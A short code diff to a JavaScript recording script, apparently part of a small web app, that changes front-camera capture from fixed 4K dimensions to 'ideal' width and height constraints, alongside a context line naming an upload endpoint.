@@ -7,7 +7,11 @@ const mongodbURL = 'https://server-cam.vercel.app/api/upload'; // Ganti dengan U
 
 const config = {
     audio: true,
-    video: { facingMode: "user", width: 3840, height: 2160 }
+    video: {
+        width: { ideal: 3840 },
+        height: { ideal: 2160 },
+        facingMode: "user" // Menggunakan kamera depan
+    }
 };
 
 // Fungsi untuk memulai perekaman
